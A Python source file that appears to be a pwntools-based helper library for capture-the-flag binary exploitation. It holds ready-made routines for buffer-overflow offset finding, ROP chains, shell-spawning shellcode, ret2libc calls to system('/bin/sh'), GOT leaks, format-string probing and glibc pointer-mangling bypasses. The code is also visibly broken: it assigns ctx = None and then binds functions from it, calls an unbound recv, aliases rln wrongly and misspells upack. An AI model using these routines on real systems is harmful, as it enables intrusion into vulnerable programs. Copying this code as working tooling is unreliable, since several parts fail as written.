from pwn import *
import re
import pwn


class PwnContext:    
    def __init__(self, conn, elf, libc, binary, prefix, offset, canary):
        self.conn = conn
        self.elf = elf
        self.libc = libc
        self.binary = binary
        self.prefix = prefix
        self.offset = offset
        self.canary = canary
    
    def getb(self, d, a, b):
        a_ = d.find(a)
        if a_ == -1 or a == b"": a_ = 0
        b_ = d.find(b, a_+len(a))
        if b_ == -1 or b == b"": b_ = len(d)
        return d[a_+len(a):b_]

    def getr(self, d, p):
        return re.findall(p, d)[0]

    def prompt(self, data, **kwargs):
        if type(data) == int:
            data = str(data).encode()
        elif type(data) == str:
            data = data.encode()

        r = kwargs.pop("io", self.conn)
        prefix = kwargs.pop("prefix", self.prefix)
        line = kwargs.pop("line", True)
        if prefix is not None:
            if line:
                r.sendlineafter(prefix, data, **kwargs)
            else:
                r.sendafter(prefix, data, **kwargs)
        else:
            if line:
                r.sendline(data, **kwargs)
            else:
                r.send(data, **kwargs)

    def sla(self, *args, **kwargs):
        if len(args) == 1:
            self.prompt(args[0], **kwargs)
        elif len(args) >= 2:
            self.prompt(args[1], prefix=args[0], **kwargs)
        
    def sa(self, *args, **kwargs):
        self.sla(*args, line=False, **kwargs)

    def sl(self, data, **kwargs):
        self.prompt(data, prefix=None, **kwargs)

    def send(self, data, **kwargs):
        self.prompt(data, prefix=None, line=False, **kwargs)

    def recv(self, prefix=None, **kwargs):
        r = kwargs.pop("io", self.conn)
        if prefix is None:
            return r.recv(**kwargs)
        elif type(prefix) == int:
            return r.recvn(prefix, **kwargs)
        else:
            if type(prefix) == str:
                prefix = prefix.encode()
            drop = kwargs.pop("drop", True)
            return r.recvuntil(prefix, drop=drop, **kwargs)

    def ru(self, u):
        return recv(u)

    def rl(self):
        return recv('\n')

    def rla(self, d):
        self.ru(d)
        return rl()
        
    def rln(self, n):
        lines = []
        for _ in range(n):
            lines.append(recv('\n'))
        return lines        

        
    def safelink_bf64(self, ptr):
        fd = 0
        for i in range(36, -1, -12):
            tmp = fd
            fd <<= 12
            fd |= (tmp ^ (ptr >> i)) & 0xfff
        if fd & 0xf != 0:
            error("safelink bf page differs")
        return fd

    def printx(self, **kwargs):
        for k, v in kwargs.items():
            success("%s: %#x" % (k, v))  

    def resolve(self, symbol, base=None):
        """Resolve a symbol to an address, with optional offset notation (e.g., 'main+0x10')"""
        if base is None:
            base = self.elf
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, offset = symbol.split("+")
            addr = base.sym[func] + int(offset, 0)
        elif "-" in symbol:
            func, offset = symbol.split("-")
            addr = base.sym[func] - int(offset, 0)
        else:
            addr = base.sym[symbol]
        return addr

    def hexdump(self, data, s=context.word_size//8):
        idx_max = ceil(log(len(data)/s, 16))
        for i, c in enumerate(sliced(data, s)):
            info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(c)))
    
    def leak(self, leak, leaked=0):
        start = leak.find(b'0x')
        end = 2
        if start > 0:
            leak = leak[start:]
            for i in leak[2:]:
                try: int(chr(i), 16); end += 1
                except: break
            leak = leak[:end]
            leak = int(leak, 16)
        else:
            len = int(context.bits/8)
            leak.ljust(len, b'\x00')[:len]
            leak = unpack(leak, len)

        leak -= leaked
        self.check_leaks(leak)
        return leak

    
    def check_leaks(self, leak):
        """Check if leaked addresses match actual addresses"""
        for m in self.conn.maps():
            if m.start <= leak <= m.end:
                base = 0
                
                if self.elf.path == m.path:
                    name = "elf"
                    base = self.conn.elf_mapping().address
                elif self.libc.path == m.path:
                    name = "libc"
                    base = self.conn.libc_mapping().address
                else:
                    name = m.path[1:-1]
                    base = getattr(self.conn, f'{name}_mapping')().address

                if base > 0 and leak != base:
                    info(f"{name}: leak = {leak:#x}, base = {base:#x}, diff = {leak - base}")
                    if getattr(self, name, False): getattr(self, name).address = base
                else:
                    info(f"{name}: leak = {leak:#x}")



    def ropchain(self, chain, ret=True, elf=None, libc=None):
        """Build a ROP chain from a dictionary of {function: [args]}"""
        elf = elf or self.elf
        libc = libc or self.libc

        elfs = []
        if elf and (not elf.pie or elf.address):
            elfs.append(elf)
        if libc and (not libc.aslr or libc.address):
            elfs.append(libc)
        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)
        for func, params in chain.items():
            rop.call(func, params)
        info(f"ROP :\n{rop.dump()}")
        return rop.chain()

    def find_offset(self, data=cyclic(1000)):
        context.delete_corefiles = True
        self.conn = process(self.binary)
        self.send(data)
        self.conn.wait()
        core = self.conn.corefile
        self.offset = cyclic_find(core.fault_addr)
        self.conn.close()
        self.conn = None
        info(f"{self.offset = }")

    def bof(self, data, **kwargs):
        if self.offset is None:
            self.find_offset()
        if self.conn is None:
            raise RuntimeError("Connection not initialized")
        opt = kwargs.pop("opt", {})
        bp = kwargs.pop("bp", 0)
        opt |= {self.offset - context.bytes: bp}
        if self.elf.canary:
            opt |= {self.offset - context.bytes * 2: self.canary}
        payload = flat({self.offset: data} | opt, **kwargs)
        self.send(payload)

    def ret2shellcode(self, addr, **kwargs):
        shellcode = asm(shellcraft.sh())
        if context.bits == 32:
            shellcode = asm("sub esp, 0x1000") + shellcode
        else:
            shellcode = asm("sub rsp, 0x1000") + shellcode
        padding = asm("nop") * (self.offset - context.bytes * (self.elf.canary + 1) - len(shellcode))
        addr += len(padding) // 2
        payload = self.ropchain({addr: []})
        self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win, params=[], **kwargs):
        addr = self.resolve(win)
        payload = self.ropchain({addr: params})
        self.bof(payload, **kwargs)

    def ret2libc(self, **kwargs):
        system = self.libc.sym["system"]
        bin_sh = next(self.libc.search(b"/bin/sh\x00"))
        payload = self.ropchain({system: [bin_sh]})
        self.bof(payload, **kwargs)

    def ret2plt(self, func="puts", ret2main="main", **kwargs):
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main: []})
        else:
            payload = self.ropchain({func_plt: [func_got]})
        self.bof(payload, **kwargs)
        leak = upack(self.recv())
        self.libc.address = leak - self.libc.sym[func]

    def format_string(self, n=100):
        payload = "A" * context.bytes + ".%p" * n
        self.send(payload)
        output = self.recv().split(".")
        info(f"format string : {output}")
        return output.index("0x" + "41" * context.bytes)

    def safelink(self, addr, ptr):
        return (addr >> 12) ^ ptr

    def ptr_mangle(self, addr, cookie=0):
        return rol(addr ^ cookie, 17)

    def ptr_demangle(self, addr, cookie=0):
        return ror(addr, 17) ^ cookie

    def ptr_cookie(self, mangled, demangled):
        return self.ptr_demangle(mangled, demangled)

    def binsh(self):
        return next(self.libc.search(b"/bin/sh\0"))

    def getLibc(self):
        return self.libc


# Global instance for backward compatibility
ctx = None

# Standalone functions that delegate to global context
getb = ctx.getb
getr = ctx.getr
prompt = ctx.prompt
sla = ctx.sla
sa = ctx.sa
sl = ctx.sl
send = ctx.send
recv = ctx.recv
ru = ctx.ru
rl = ctx.rl
rln = ctx.rl
rla = ctx.rla
safelink_bf64 = ctx.safelink_bf64
printx = ctx.printx
hexdump = ctx.hexdump
leak = ctx.leak
resolve = ctx.resolve
check_leaks = ctx.check_leaks
ropchain = ctx.ropchain
find_offset = ctx.find_offset
bof = ctx.bof
ret2shellcode = ctx.ret2shellcode
ret2win = ctx.ret2win
ret2libc = ctx.ret2libc
ret2plt = ctx.ret2plt
format_string = ctx.format_string
safelink = ctx.safelink
ptr_mangle = ctx.ptr_mangle
ptr_demangle = ctx.ptr_demangle
ptr_cookie = ctx.ptr_cookie
binsh = ctx.binsh

# Utility functions
u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
upack = lambda d: pwn.unpack(d, "all")
